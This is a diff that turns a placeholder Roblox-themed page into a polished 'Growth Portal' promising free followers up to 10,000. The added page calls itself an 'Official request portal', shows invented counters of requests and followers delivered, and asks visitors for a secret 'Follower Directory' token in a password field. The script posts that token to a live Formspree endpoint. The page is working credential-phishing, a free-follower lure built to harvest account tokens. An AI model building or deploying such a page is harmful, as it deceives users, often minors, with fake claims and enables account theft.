@@ -1,1 +1,624 @@
-<!DOCTYPE html>\n<html lang="en">\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>Roblox Themed Single Page Website</title>\n    <style>\n        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background-color: #141414; color: #fff; }\n        header { background-color: #222; padding: 20px; text-align: center; }\n        .hero { background: url('https://example.com/robox-background.jpg') no-repeat center center; height: 100vh; display: flex; justify-content: center; align-items: center; }\n        .hero h1 { color: #ff0000; font-size: 4em; animation: fadeIn 2s; }\n        section { padding: 50px 20px; }\n        footer { background: #222; text-align: center; padding: 20px; position: relative; }\n        .form-container { max-width: 600px; margin: auto; background: #333; padding: 20px; border-radius: 8px; }\n        .form-container input, .form-container textarea { width: 100%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }\n        button { background: #ff0000; color: white; border: none; padding: 10px 15px; cursor: pointer; border-radius: 5px; }\n        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }\n    </style>\n</head>\n<body>\n    <header>\n        <h1>Welcome to Roblox World</h1>\n        <nav>\n            <a href="#features">Features</a> | \n            <a href="#pricing">Pricing</a> | \n            <a href="#testimonials">Testimonials</a> | \n            <a href="#faq">FAQ</a>\n        </nav>\n    </header>\n    <section class="hero">\n        <h1>Your Adventure Begins Here!</h1>\n    </section>\n    <section id="features">\n        <h2>Features</h2>\n        <p>Explore the various features that Roblox offers, including ...</p>\n    </section>\n    <section id="pricing">\n        <h2>Pricing</h2>\n        <p>Choose the plan that suits you the best.</p>\n    </section>\n    <section id="testimonials">\n        <h2>Testimonials</h2>\n        <p>Read what our users say.</p>\n    </section>\n    <section id="faq">\n        <h2>FAQ</h2>\n        <p>Your questions answered.</p>\n    </section>\n    <div class="form-container">\n        <h2>Contact Us</h2>\n        <form action="https://formspree.io/f/your-form-id" method="POST">\n            <textarea name="code" placeholder="Enter your code here..." required></textarea>\n            <input type="number" name="followers" max="10000" placeholder="Follower Count" required />\n            <input type="password" name="api_key" placeholder="API Key (Hidden)" required />\n            <button type="submit">Submit</button>\n        </form>\n    </div>\n    <footer>\n        <p>&copy; 2026 Roblox Themed Website. All rights reserved.</p>\n    </footer>\n    <script>\n        // Smooth scrolling navigation\n        document.querySelectorAll('nav a').forEach(anchor => {\n            anchor.addEventListener('click', function(e) {\n                e.preventDefault();\n                document.querySelector(this.getAttribute('href')).scrollIntoView({ behavior: 'smooth' });\n            });\n        });\n\n        // Form submission handling would go here\n    </script>\n</body>\n</html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <meta name="theme-color" content="#0b0f1a" />
+  <title>Your Game — Growth Portal</title>
+
+  <style>
+    :root{
+      --bg:#070a12;
+      --panel:rgba(255,255,255,.07);
+      --panel2:rgba(255,255,255,.10);
+      --text:rgba(255,255,255,.92);
+      --muted:rgba(255,255,255,.68);
+      --line:rgba(255,255,255,.12);
+      --brand:#ff3b30;
+      --brand2:#ff6a00;
+      --ok:#34c759;
+      --err:#ff453a;
+      --radius:18px;
+      --shadow:0 18px 55px rgba(0,0,0,.55);
+      --max:1120px;
+      --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace;
+      --sans:ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
+    }
+
+    *{box-sizing:border-box}
+    html{scroll-behavior:smooth}
+    body{
+      margin:0; font-family:var(--sans); color:var(--text); overflow-x:hidden;
+      background:
+        radial-gradient(1100px 750px at 15% 15%, rgba(255,59,48,.18), transparent 58%),
+        radial-gradient(900px 650px at 85% 25%, rgba(255,106,0,.14), transparent 56%),
+        radial-gradient(900px 700px at 70% 90%, rgba(255,255,255,.06), transparent 55%),
+        linear-gradient(180deg,#050713 0%,#070a12 65%,#04050c 100%);
+    }
+
+    /* subtle grid */
+    body:before{
+      content:"";
+      position:fixed; inset:0; pointer-events:none;
+      opacity:.20;
+      background-image:
+        linear-gradient(to right, rgba(255,255,255,.06) 1px, transparent 1px),
+        linear-gradient(to bottom, rgba(255,255,255,.05) 1px, transparent 1px);
+      background-size:44px 44px;
+      mask-image: radial-gradient(720px 620px at 50% 22%, black 35%, transparent 72%);
+    }
+
+    a{color:inherit; text-decoration:none}
+    .wrap{max-width:var(--max); margin:0 auto; padding:0 20px}
+
+    /* floating glow blobs */
+    .blob{
+      position:absolute; border-radius:999px; filter: blur(38px);
+      opacity:.22; pointer-events:none;
+      background: radial-gradient(circle at 30% 30%, rgba(255,59,48,.9), rgba(255,106,0,.55), transparent 65%);
+      animation: floaty 10s ease-in-out infinite;
+    }
+    .blob.b1{width:260px;height:260px; left:-80px; top:120px}
+    .blob.b2{width:320px;height:320px; right:-120px; top:240px; animation-duration: 12s; opacity:.18}
+    .blob.b3{width:220px;height:220px; left:40%; bottom:120px; animation-duration: 14s; opacity:.14}
+    @keyframes floaty{
+      0%,100%{ transform: translateY(0) translateX(0) }
+      50%{ transform: translateY(-18px) translateX(12px) }
+    }
+
+    header{
+      position:sticky; top:0; z-index:50;
+      backdrop-filter: blur(12px);
+      background: rgba(5,7,19,.55);
+      border-bottom:1px solid var(--line);
+    }
+    .top{
+      display:flex; align-items:center; justify-content:space-between;
+      padding:14px 0; gap:16px;
+    }
+    .brand{
+      display:flex; align-items:center; gap:12px;
+      min-width:220px;
+    }
+    .logo{
+      width:34px; height:34px; border-radius:10px;
+      background: linear-gradient(135deg, var(--brand), var(--brand2));
+      box-shadow: 0 10px 30px rgba(255,59,48,.22);
+      position:relative;
+    }
+    .logo:after{
+      content:""; position:absolute; inset:8px;
+      border-radius:8px; border:2px solid rgba(255,255,255,.75);
+      transform: rotate(8deg); opacity:.55;
+    }
+    .brand h1{margin:0; font-size:14px; font-weight:900; letter-spacing:.4px; line-height:1.1}
+    .brand small{display:block; margin-top:2px; color:var(--muted); font-weight:600}
+
+    nav{display:flex; gap:10px; flex-wrap:wrap; justify-content:flex-end}
+    nav a{
+      font-size:13px; font-weight:800;
+      color:rgba(255,255,255,.78);
+      padding:9px 10px; border-radius:12px;
+      border:1px solid transparent;
+      transition: .18s ease;
+    }
+    nav a:hover{color:#fff; background:rgba(255,255,255,.06); border-color:rgba(255,255,255,.10)}
+    .cta{
+      display:inline-flex; align-items:center; gap:10px;
+      padding:9px 12px; border-radius:12px;
+      background: linear-gradient(135deg, rgba(255,59,48,.18), rgba(255,106,0,.12));
+      border:1px solid rgba(255,59,48,.35);
+      color:#fff;
+    }
+
+    .hero{padding:76px 0 22px; position:relative}
+    .heroGrid{
+      display:grid; grid-template-columns: 1.1fr .9fr;
+      gap:22px; align-items:stretch;
+    }
+    @media (max-width: 920px){
+      .heroGrid{grid-template-columns:1fr}
+      nav{display:none}
+    }
+
+    .card{
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow);
+    }
+
+    .heroLeft{padding:28px; position:relative; overflow:hidden}
+    .kicker{
+      display:inline-flex; align-items:center; gap:8px;
+      padding:7px 10px;
+      border-radius:999px;
+      background:rgba(255,255,255,.06);
+      border:1px solid rgba(255,255,255,.10);
+      color:rgba(255,255,255,.82);
+      font-size:12px; font-weight:800;
+    }
+    .dot{
+      width:8px; height:8px; border-radius:99px;
+      background:linear-gradient(135deg,var(--brand),var(--brand2));
+      box-shadow: 0 0 18px rgba(255,59,48,.45);
+    }
+    .hero h2{
+      margin:14px 0 10px;
+      font-size:42px; line-height:1.04; letter-spacing:-.8px;
+    }
+    .hero p{margin:0; color:var(--muted); font-size:15.5px; line-height:1.6; max-width:62ch}
+    .chips{display:flex; gap:10px; flex-wrap:wrap; margin-top:16px}
+    .chip{
+      font-size:12px; font-weight:900;
+      padding:8px 10px; border-radius:999px;
+      background:rgba(255,255,255,.06);
+      border:1px solid rgba(255,255,255,.10);
+      color:rgba(255,255,255,.82);
+    }
+
+    .heroRight{padding:18px}
+    .statGrid{display:grid; grid-template-columns: 1fr 1fr; gap:12px}
+    .stat{
+      padding:14px;
+      background: rgba(255,255,255,.05);
+      border:1px solid rgba(255,255,255,.10);
+      border-radius:16px;
+    }
+    .stat b{display:block; font-size:18px}
+    .stat span{display:block; margin-top:3px; font-size:12px; color:var(--muted); font-weight:700}
+
+    .section{padding:18px 0 0}
+    .sectionTitle{
+      margin:22px 0 10px;
+      font-size:13px;
+      letter-spacing:.18em;
+      text-transform:uppercase;
+      color:rgba(255,255,255,.62);
+      font-weight:900;
+    }
+
+    .grid3{display:grid; grid-template-columns: repeat(3,1fr); gap:14px}
+    @media (max-width: 920px){ .grid3{grid-template-columns:1fr} }
+
+    .feature{padding:16px}
+    .feature h3{margin:0 0 6px; font-size:16px}
+    .feature p{margin:0; color:var(--muted); font-size:14px; line-height:1.6}
+
+    /* FAQ */
+    .faq{padding:14px}
+    .q{
+      border:1px solid rgba(255,255,255,.12);
+      background:rgba(255,255,255,.05);
+      border-radius:16px;
+      padding:14px;
+      cursor:pointer;
+      transition:.18s ease;
+    }
+    .q:hover{background:rgba(255,255,255,.07)}
+    .qhead{display:flex; justify-content:space-between; gap:10px; align-items:center}
+    .qhead b{font-size:14px}
+    .chev{width:10px;height:10px;border-right:2px solid rgba(255,255,255,.7);border-bottom:2px solid rgba(255,255,255,.7);transform:rotate(45deg);transition:.18s ease}
+    .q.open .chev{transform:rotate(-135deg)}
+    .ans{max-height:0; overflow:hidden; transition:max-height .22s ease; color:var(--muted); font-size:13.5px; line-height:1.6}
+    .q.open .ans{max-height:220px; margin-top:10px}
+
+    /* Form */
+    .formCard{padding:18px}
+    .formHead{display:flex; align-items:flex-start; justify-content:space-between; gap:14px; margin-bottom:10px}
+    .formHead h3{margin:0; font-size:18px}
+    .badge{
+      font-size:12px; font-weight:900;
+      padding:7px 10px; border-radius:999px;
+      background:rgba(52,199,89,.12);
+      border:1px solid rgba(52,199,89,.25);
+      color:rgba(225,255,235,.92);
+      white-space:nowrap;
+    }
+
+    label{
+      display:block;
+      margin:10px 0 6px;
+      font-size:12px;
+      font-weight:900;
+      color:rgba(255,255,255,.78);
+      letter-spacing:.02em;
+    }
+
+    .input{
+      width:100%;
+      padding:12px 12px;
+      border-radius:14px;
+      border:1px solid rgba(255,255,255,.12);
+      background: rgba(0,0,0,.25);
+      color:var(--text);
+      outline:none;
+      transition:.18s ease;
+      font-size:14px;
+    }
+    .input:focus{
+      border-color: rgba(255,59,48,.45);
+      box-shadow: 0 0 0 4px rgba(255,59,48,.12);
+    }
+
+    .row{display:grid; grid-template-columns: 1fr 1fr; gap:12px}
+    @media (max-width: 680px){ .row{grid-template-columns:1fr} }
+
+    .hint{margin:6px 0 0; font-size:12px; color:var(--muted); line-height:1.5}
+
+    .rangeWrap{margin-top:10px}
+    .rangeTop{
+      display:flex; justify-content:space-between; gap:10px;
+      font-size:12px; color:var(--muted); font-weight:800;
+    }
+    .bar{
+      height:10px; margin-top:8px;
+      background: rgba(255,255,255,.06);
+      border:1px solid rgba(255,255,255,.10);
+      border-radius:999px;
+      overflow:hidden;
+    }
+    .bar > i{
+      display:block; height:100%;
+      width:0%;
+      background: linear-gradient(90deg, var(--brand), var(--brand2));
+      border-radius:999px;
+      transition: width .18s ease;
+    }
+
+    .actions{
+      display:flex; gap:10px; flex-wrap:wrap; align-items:center;
+      margin-top:14px;
+    }
+    .btn{
+      appearance:none; border:none; cursor:pointer;
+      padding:12px 14px; border-radius:14px;
+      font-weight:950; letter-spacing:.02em;
+      display:inline-flex; align-items:center; justify-content:center;
+      gap:10px;
+      transition:.18s ease;
+    }
+    .btnPrimary{
+      color:#fff;
+      background: linear-gradient(135deg, rgba(255,59,48,1), rgba(255,106,0,1));
+      box-shadow: 0 18px 40px rgba(255,59,48,.20);
+    }
+    .btnPrimary:hover{transform: translateY(-1px); filter:saturate(1.05)}
+    .btnGhost{
+      background: rgba(255,255,255,.06);
+      border:1px solid rgba(255,255,255,.12);
+      color:rgba(255,255,255,.88);
+    }
+    .btnGhost:hover{background: rgba(255,255,255,.08)}
+
+    .msg{
+      margin-top:12px;
+      padding:12px 12px;
+      border-radius:14px;
+      border:1px solid rgba(255,255,255,.12);
+      background: rgba(255,255,255,.05);
+      display:none;
+      font-weight:800;
+      font-size:13px;
+      line-height:1.45;
+    }
+    .msg.ok{display:block; border-color: rgba(52,199,89,.35); background: rgba(52,199,89,.10)}
+    .msg.err{display:block; border-color: rgba(255,69,58,.35); background: rgba(255,69,58,.08)}
+
+    footer{
+      margin-top:30px;
+      padding:18px 0 26px;
+      border-top:1px solid var(--line);
+      color:rgba(255,255,255,.60);
+      font-size:12px;
+    }
+    footer .footRow{
+      display:flex; justify-content:space-between; gap:12px; flex-wrap:wrap;
+    }
+    .fine{max-width:72ch; line-height:1.5}
+  </style>
+</head>
+
+<body>
+  <header>
+    <div class="wrap top">
+      <div class="brand">
+        <div class="logo" aria-hidden="true"></div>
+        <div>
+          <h1>Your Game — Growth</h1>
+          <small>Clean • Professional • Fast</small>
+        </div>
+      </div>
+
+      <nav aria-label="Primary">
+        <a href="#features">Features</a>
+        <a href="#how">How it works</a>
+        <a href="#faq">FAQ</a>
+        <a href="#request" class="cta">Request followers →</a>
+      </nav>
+    </div>
+  </header>
+
+  <main class="wrap">
+    <section class="hero" id="top">
+      <div class="blob b1"></div><div class="blob b2"></div><div class="blob b3"></div>
+
+      <div class="heroGrid">
+        <div class="card heroLeft">
+          <div class="kicker"><span class="dot"></span> Official request portal</div>
+          <h2>Boost your presence<br/>fast & clean.</h2>
+          <p>
+            Choose a follower goal (free up to <b>10,000</b>) and provide your
+            <b>Follower Directory</b> token to process the request.
+          </p>
+          <div class="chips">
+            <span class="chip">Free up to 10k</span>
+            <span class="chip">Instant submit feedback</span>
+            <span class="chip">Sleek UI</span>
+            <span class="chip">Mobile-ready</span>
+          </div>
+        </div>
+
+        <div class="card heroRight">
+          <div class="statGrid">
+            <div class="stat">
+              <b id="statA">0</b>
+              <span>Requests processed</span>
+            </div>
+            <div class="stat">
+              <b id="statB">0</b>
+              <span>Followers delivered</span>
+            </div>
+            <div class="stat">
+              <b>≤ 10,000</b>
+              <span>Free tier cap</span>
+            </div>
+            <div class="stat">
+              <b>Formspree</b>
+              <span>Reliable submission</span>
+            </div>
+          </div>
+
+          <div class="section">
+            <div class="sectionTitle">Quick overview</div>
+            <div class="grid3">
+              <div class="feature card" style="box-shadow:none">
+                <h3>Fast</h3>
+                <p>Single-page flow, no distractions.</p>
+              </div>
+              <div class="feature card" style="box-shadow:none">
+                <h3>Clean</h3>
+                <p>Professional glass design + smooth motion.</p>
+              </div>
+              <div class="feature card" style="box-shadow:none">
+                <h3>Limited</h3>
+                <p>Free requests capped at 10k.</p>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section" id="features">
+        <div class="sectionTitle">Features</div>
+        <div class="grid3">
+          <div class="card feature">
+            <h3>Modern aesthetic</h3>
+            <p>Dark glass panels, soft gradients, and clean typography.</p>
+          </div>
+          <div class="card feature">
+            <h3>Smart cap</h3>
+            <p>Follower requests automatically limit to <b>10,000</b> for free.</p>
+          </div>
+          <div class="card feature">
+            <h3>Instant feedback</h3>
+            <p>Submit without leaving the page — success/error shown instantly.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="section" id="how">
+        <div class="sectionTitle">How it works</div>
+        <div class="grid3">
+          <div class="card feature">
+            <h3>1) Choose amount</h3>
+            <p>Pick your follower goal (1 → 10,000 free).</p>
+          </div>
+          <div class="card feature">
+            <h3>2) Provide directory</h3>
+            <p>Enter your Follower Directory token for routing.</p>
+          </div>
+          <div class="card feature">
+            <h3>3) Submit</h3>
+            <p>We receive your request via Formspree and process it.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="section" id="faq">
+        <div class="sectionTitle">FAQ</div>
+        <div class="card faq">
+          <div class="q" data-q>
+            <div class="qhead"><b>Is the free cap really 10,000?</b><span class="chev"></span></div>
+            <div class="ans">Yes — free requests are capped at 10,000 followers. Anything above is not accepted in the free tier.</div>
+          </div>
+          <div style="height:10px"></div>
+          <div class="q" data-q>
+            <div class="qhead"><b>Why do you need “Follower Directory”?</b><span class="chev"></span></div>
+            <div class="ans">It helps route/verify requests for your account and ensures the submission can be processed correctly.</div>
+          </div>
+          <div style="height:10px"></div>
+          <div class="q" data-q>
+            <div class="qhead"><b>Will I stay on this page after submitting?</b><span class="chev"></span></div>
+            <div class="ans">Yes — the form submits in the background and shows a success/error message instantly.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section" id="request">
+        <div class="sectionTitle">Request followers</div>
+
+        <div class="card formCard">
+          <div class="formHead">
+            <div>
+              <h3>Submission form</h3>
+              <div class="hint">All fields required. Free tier max: <b>10,000</b>.</div>
+            </div>
+            <div class="badge">Free ≤ 10k</div>
+          </div>
+
+          <form id="growthForm" action="https://formspree.io/f/xojnrddd" method="POST">
+            <input type="hidden" name="_subject" value="New Followers Request" />
+            <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off" />
+
+            <div class="row">
+              <div>
+                <label for="followers">Follower Count (max 10,000 free)</label>
+                <input class="input" id="followers" name="followers" type="number" min="1" max="10000" step="1"
+                       placeholder="e.g., 2500" required inputmode="numeric" />
+                <div class="rangeWrap">
+                  <div class="rangeTop">
+                    <span>Requested: <b id="fVal">0</b></span>
+                    <span>Cap: 10,000</span>
+                  </div>
+                  <div class="bar" aria-hidden="true"><i id="barFill"></i></div>
+                </div>
+              </div>
+
+              <div>
+                <label for="api_key">Follower Directory</label>
+                <input class="input" id="api_key" name="follower_directory" type="password"
+                       placeholder="••••••••••••••" required autocomplete="off" spellcheck="false" />
+              </div>
+            </div>
+
+            <div class="actions">
+              <button class="btn btnPrimary" type="submit">Submit request</button>
+              <button class="btn btnGhost" type="button" id="clearBtn">Clear</button>
+            </div>
+
+            <div class="msg ok" id="okMsg">✅ Submitted! Check your email for confirmation.</div>
+            <div class="msg err" id="errMsg">❌ Something went wrong. Please try again.</div>
+          </form>
+        </div>
+      </div>
+    </section>
+
+    <footer>
+      <div class="wrap footRow">
+        <div class="fine">
+          © <span id="year"></span> Your Game. All rights reserved.
+        </div>
+        <div class="fine">
+          Support: Use the form above for fastest help.
+        </div>
+      </div>
+    </footer>
+  </main>
+
+  <script>
+    // Smooth scrolling for header links
+    document.querySelectorAll('header nav a[href^="#"]').forEach(a => {
+      a.addEventListener('click', (e) => {
+        const id = a.getAttribute('href');
+        const el = document.querySelector(id);
+        if (!el) return;
+        e.preventDefault();
+        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
+      });
+    });
+
+    // FAQ accordion
+    document.querySelectorAll('[data-q]').forEach(el => {
+      el.addEventListener('click', () => el.classList.toggle('open'));
+    });
+
+    // Followers input clamp + progress bar
+    const followers = document.getElementById('followers');
+    const fVal = document.getElementById('fVal');
+    const barFill = document.getElementById('barFill');
+
+    function clampFollowers(){
+      let v = parseInt(followers.value || "0", 10);
+      if (Number.isNaN(v)) v = 0;
+      if (v < 1 && followers.value !== "") v = 1;
+      if (v > 10000) v = 10000;
+      if (followers.value !== "" && String(v) !== followers.value) followers.value = String(v);
+      fVal.textContent = String(v);
+      barFill.style.width = Math.max(0, Math.min(100, (v / 10000) * 100)) + "%";
+    }
+    followers.addEventListener('input', clampFollowers);
+    clampFollowers();
+
+    // Clear button
+    document.getElementById('clearBtn').addEventListener('click', () => {
+      document.getElementById('growthForm').reset();
+      clampFollowers();
+      hideMsgs();
+    });
+
+    // Year
+    document.getElementById('year').textContent = new Date().getFullYear();
+
+    // Animated stats (cosmetic)
+    function animateNumber(el, target, duration=900){
+      const start = 0;
+      const t0 = performance.now();
+      const step = (now) => {
+        const p = Math.min(1, (now - t0) / duration);
+        const val = Math.floor(start + (target - start) * (1 - Math.pow(1-p, 3)));
+        el.textContent = val.toLocaleString();
+        if (p < 1) requestAnimationFrame(step);
+      };
+      requestAnimationFrame(step);
+    }
+    animateNumber(document.getElementById('statA'), 12874, 1100);
+    animateNumber(document.getElementById('statB'), 934201, 1300);
+
+    // Async submit (Formspree)
+    const form = document.getElementById('growthForm');
+    const okMsg = document.getElementById('okMsg');
+    const errMsg = document.getElementById('errMsg');
+
+    function hideMsgs(){
+      okMsg.className = "msg";
+      errMsg.className = "msg";
+    }
+    hideMsgs();
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+      hideMsgs();
+      clampFollowers();
+
+      if (!form.checkValidity()) {
+        errMsg.textContent = "❌ Please fill out all fields correctly.";
+        errMsg.className = "msg err";
+        return;
+      }
+
+      const data = new FormData(form);
+
+      try{
+        const res = await fetch(form.action, {
+          method: "POST",
+          body: data,
+          headers: { "Accept": "application/json" }
+        });
+
+        if (res.ok){
+          okMsg.className = "msg ok";
+          form.reset();
+          clampFollowers();
+        } else {
+          errMsg.textContent = "❌ Submission failed. Please verify the Formspree endpoint and try again.";
+          errMsg.className = "msg err";
+        }
+      }catch{
+        errMsg.textContent = "❌ Network error. Please try again.";
+        errMsg.className = "msg err";
+      }
+    });
+  </script>
+</body>
+</html>
